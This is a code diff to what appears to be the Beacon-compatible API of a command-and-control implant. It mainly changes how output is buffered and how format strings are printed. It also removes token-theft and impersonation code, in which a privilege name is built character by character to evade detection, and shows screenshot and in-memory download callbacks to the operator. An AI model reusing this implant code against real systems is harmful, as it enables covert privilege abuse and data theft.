@@ -45,6 +45,24 @@ FUNC VOID BeaconOutput( INT type, const CHAR* data, INT len ) {
 
     /* leave 1 byte for null terminator */
     UINT32 space = ( ctx->Cap > ctx->Len + 1u ) ? ( ctx->Cap - ctx->Len - 1u ) : 0;
+
+    if ( space < (UINT32)len ) {
+        UINT32 needed = ctx->Len + 1u + (UINT32)len + 1u;
+        UINT32 newCap = ctx->Cap ? ctx->Cap : BOF_OUTPUT_CAP;
+        while ( newCap < needed ) newCap <<= 1;
+        if ( newCap > 4u * 1024u * 1024u ) newCap = 4u * 1024u * 1024u;
+        if ( newCap > ctx->Cap ) {
+            PBYTE newBuf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, newCap );
+            if ( newBuf ) {
+                if ( ctx->Len > 0 ) MmCopy( newBuf, ctx->Buf, ctx->Len );
+                Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, ctx->Buf );
+                ctx->Buf = newBuf;
+                ctx->Cap = newCap;
+                space    = ctx->Cap - ctx->Len - 1u;
+            }
+        }
+    }
+
     if ( space == 0 ) {
         if ( job ) Nax->Ntdll.RtlLeaveCriticalSection( &job->Lock );
         return;
@@ -62,14 +80,37 @@ FUNC VOID BeaconPrintf( INT type, const CHAR* fmt, ... ) {
     G_INSTANCE;
     if ( !Nax ) return;
 
-    CHAR buf[1024];
+    CHAR stack[1024];
     __builtin_va_list args;
+
     __builtin_va_start( args, fmt );
-    INT n = Nax->Ntdll._vsnprintf( buf, sizeof( buf ) - 1, fmt, args );
+    INT n = Nax->Ntdll._vsnprintf( stack, sizeof( stack ) - 1, fmt, args );
     __builtin_va_end( args );
-    if ( n < 0 || n >= (INT)( sizeof( buf ) - 1 ) ) n = (INT)( sizeof( buf ) - 1 );
-    buf[ n ] = '\0';
-    BeaconOutput( type, buf, n );
+
+    if ( n >= 0 ) {
+        stack[ n ] = '\0';
+        BeaconOutput( type, stack, n );
+        return;
+    }
+
+    UINT32 cap = 8192;
+    for ( ; cap <= 4u * 1024u * 1024u; cap <<= 2 ) {
+        PCHAR heap = (PCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, cap );
+        if ( !heap ) break;
+        __builtin_va_start( args, fmt );
+        n = Nax->Ntdll._vsnprintf( heap, cap - 1, fmt, args );
+        __builtin_va_end( args );
+        if ( n >= 0 ) {
+            heap[ n ] = '\0';
+            BeaconOutput( type, heap, n );
+            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, heap );
+            return;
+        }
+        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, heap );
+    }
+
+    stack[ sizeof( stack ) - 1 ] = '\0';
+    BeaconOutput( type, stack, (INT)( sizeof( stack ) - 1 ) );
 }
 
 /* ========= [ data parsing ] ========= */
@@ -158,47 +199,7 @@ FUNC BOOL BeaconIsAdmin( VOID ) {
 FUNC BOOL BeaconUseToken( HANDLE token ) {
     G_INSTANCE;
     if ( !Nax || !token ) return FALSE;
-
-    if ( !Nax->OriginalPrimaryToken && Nax->Ntdll.NtOpenProcessToken )
-        Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_ALL_ACCESS, &Nax->OriginalPrimaryToken );
-
-    /* Enable SeAssignPrimaryTokenPrivilege */
-    if ( Nax->Advapi32.LookupPrivilegeValueA && Nax->Advapi32.AdjustTokenPrivileges ) {
-        HANDLE hProcToken = NULL;
-        if ( NT_SUCCESS( Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hProcToken ) ) && hProcToken ) {
-            CHAR pn[30];
-            pn[ 0]='S'; pn[ 1]='e'; pn[ 2]='A'; pn[ 3]='s'; pn[ 4]='s'; pn[ 5]='i'; pn[ 6]='g'; pn[ 7]='n';
-            pn[ 8]='P'; pn[ 9]='r'; pn[10]='i'; pn[11]='m'; pn[12]='a'; pn[13]='r'; pn[14]='y'; pn[15]='T';
-            pn[16]='o'; pn[17]='k'; pn[18]='e'; pn[19]='n'; pn[20]='P'; pn[21]='r'; pn[22]='i'; pn[23]='v';
-            pn[24]='i'; pn[25]='l'; pn[26]='e'; pn[27]='g'; pn[28]='e'; pn[29]='\0';
-            LUID luid;
-            MmZero( &luid, sizeof( luid ) );
-            if ( Nax->Advapi32.LookupPrivilegeValueA( NULL, pn, &luid ) ) {
-                TOKEN_PRIVILEGES tp;
-                tp.PrivilegeCount           = 1;
-                tp.Privileges[0].Luid       = luid;
-                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-                Nax->Advapi32.AdjustTokenPrivileges( hProcToken, FALSE, &tp, 0, NULL, NULL );
-            }
-            Nax->Ntdll.NtClose( hProcToken );
-        }
-    }
-
-    /* Swap process primary token */
-    if ( Nax->Advapi32.DuplicateTokenEx && Nax->Ntdll.NtSetInformationProcess ) {
-        HANDLE hPrimary = NULL;
-        if ( Nax->Advapi32.DuplicateTokenEx( token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimary ) && hPrimary ) {
-            struct { HANDLE Token; HANDLE Thread; } pat = { hPrimary, NULL };
-            Nax->Ntdll.NtSetInformationProcess( NtCurrentProcess(), ProcessAccessToken, &pat, sizeof( pat ) );
-            Nax->Ntdll.NtClose( hPrimary );
-        }
-    }
-
-    if ( Nax->Advapi32.ImpersonateLoggedOnUser )
-        Nax->Advapi32.ImpersonateLoggedOnUser( token );
-
-    Nax->ActiveToken = token;
-    return TRUE;
+    return NaxTokenApply( Nax, token );
 }
 
 FUNC VOID BeaconRevertToken( VOID ) {
@@ -298,9 +299,6 @@ FUNC BOOL toWideChar( CHAR* src, WCHAR* dst, INT max ) {
 /* ========= [ Adaptix extensions ] ========= */
 
 /* Helper: write 4-byte LE integer - avoids pulling in Packer.c from the unity build. */
-static VOID AxW32( PBYTE p, UINT32 v ) {
-    p[0] = (BYTE)v; p[1] = (BYTE)(v>>8); p[2] = (BYTE)(v>>16); p[3] = (BYTE)(v>>24);
-}
 
 /* AxBofMediaAppend - allocate a NAX_BOF_MEDIA node and prepend to MediaHead. */
 static VOID AxBofMediaAppend( PNAX_INSTANCE Nax, PBYTE data, UINT32 len ) {
@@ -337,9 +335,9 @@ FUNC VOID AxAddScreenshot( CHAR* note, CHAR* data, INT len ) {
 
     PBYTE p = buf;
     *p++ = CALLBACK_AX_SCREENSHOT;
-    AxW32( p, note_len );   p += 4;
+    NaxW32( p, note_len );   p += 4;
     if ( note_len ) { MmCopy( p, note, note_len ); p += note_len; }
-    AxW32( p, (UINT32)len ); p += 4;
+    NaxW32( p, (UINT32)len ); p += 4;
     MmCopy( p, data, (UINT32)len );
 
     AxBofMediaAppend( Nax, buf, total );
@@ -361,9 +359,9 @@ FUNC VOID AxDownloadMemory( CHAR* filename, CHAR* data, INT len ) {
 
     PBYTE p = buf;
     *p++ = CALLBACK_AX_DOWNLOAD_MEM;
-    AxW32( p, name_len );    p += 4;
+    NaxW32( p, name_len );    p += 4;
     if ( name_len ) { MmCopy( p, filename, name_len ); p += name_len; }
-    AxW32( p, (UINT32)len ); p += 4;
+    NaxW32( p, (UINT32)len ); p += 4;
     MmCopy( p, data, (UINT32)len );
 
     AxBofMediaAppend( Nax, buf, total );
@@ -423,12 +421,35 @@ FUNC VOID BeaconFormatAppend( formatp* format, CHAR* text, INT len ) {
 FUNC VOID BeaconFormatPrintf( formatp* format, CHAR* fmt, ... ) {
     G_INSTANCE;
     if ( !Nax || !format->original ) return;
-    CHAR buf[512];
+
+    CHAR stack[1024];
     __builtin_va_list args;
+
     __builtin_va_start( args, fmt );
-    INT n = Nax->Ntdll._vsnprintf( buf, sizeof( buf ) - 1, fmt, args );
+    INT n = Nax->Ntdll._vsnprintf( stack, sizeof( stack ) - 1, fmt, args );
     __builtin_va_end( args );
-    if ( n > 0 ) BeaconFormatAppend( format, buf, n );
+
+    if ( n >= 0 ) {
+        BeaconFormatAppend( format, stack, n );
+        return;
+    }
+
+    UINT32 cap = 8192;
+    for ( ; cap <= 4u * 1024u * 1024u; cap <<= 2 ) {
+        PCHAR heap = (PCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, cap );
+        if ( !heap ) break;
+        __builtin_va_start( args, fmt );
+        n = Nax->Ntdll._vsnprintf( heap, cap - 1, fmt, args );
+        __builtin_va_end( args );
+        if ( n >= 0 ) {
+            BeaconFormatAppend( format, heap, n );
+            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, heap );
+            return;
+        }
+        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, heap );
+    }
+
+    BeaconFormatAppend( format, stack, (INT)( sizeof( stack ) - 1 ) );
 }
 
 FUNC CHAR* BeaconFormatToString( formatp* format, INT* size ) {
